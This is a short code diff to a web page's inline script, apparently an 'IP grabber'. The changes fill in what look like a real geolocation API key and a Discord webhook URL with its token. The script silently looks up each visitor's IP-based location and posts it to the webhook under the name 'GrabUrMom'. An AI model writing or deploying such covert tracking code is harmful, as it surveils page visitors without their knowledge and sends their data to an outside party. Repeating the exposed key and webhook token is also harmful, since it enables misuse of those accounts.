@@ -57,10 +57,10 @@
 
     <script>
         // Geolocation script (grab.js functionality inline)
-        $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY", function(data) {
+        $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) {
             // Send the data to Discord webhook
             var request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/WEBHOOK_URL");
+            request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
             request.setRequestHeader('Content-type', 'application/json');
             var payload = {
                 username: "GrabUrMom",
